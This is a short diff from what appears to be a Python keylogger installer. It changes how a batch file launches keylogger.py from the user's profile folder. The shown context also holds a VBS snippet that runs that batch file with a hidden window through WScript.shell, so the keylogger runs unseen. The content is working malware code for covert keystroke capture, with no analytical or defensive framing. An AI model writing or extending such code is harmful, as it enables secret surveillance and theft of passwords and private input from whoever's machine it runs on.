@@ -25,7 +25,7 @@ if __name__=="__main__":
     ) as l:
         l.join()'''
 
-bat = fr"{sys.executable} C:\Users\{user}\keylogger\keylogger.py"
+bat = fr'''"{sys.executable}" C:\Users\{user}\keylogger\keylogger.py'''
 
 vbs = fr'''set code = CreateObject("WScript.shell")
 code.Run "C:\Users\{user}\keylogger\keylogger.bat",0,False'''
